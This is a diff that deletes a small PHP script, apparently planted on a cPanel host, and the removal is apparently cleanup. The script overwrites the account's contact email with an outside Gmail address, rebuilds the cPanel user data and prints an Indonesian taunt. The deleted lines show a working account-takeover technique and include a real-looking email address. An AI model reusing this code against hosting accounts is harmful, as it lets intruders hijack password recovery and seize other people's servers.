@@ -1,7 +1,0 @@
-<?php
-$user = 'stppmeda';
-$newEmail = 'happyasmara772@gmail.com';
-file_put_contents("/home/stppmeda/.cpanel/contactinfo", $newEmail);
-exec("/usr/local/cpanel/bin/updateuserdata $user");
-echo "EMAIL DIUBAH DAN CPANEL DIREBUILD, BANGSAT!";
-?>
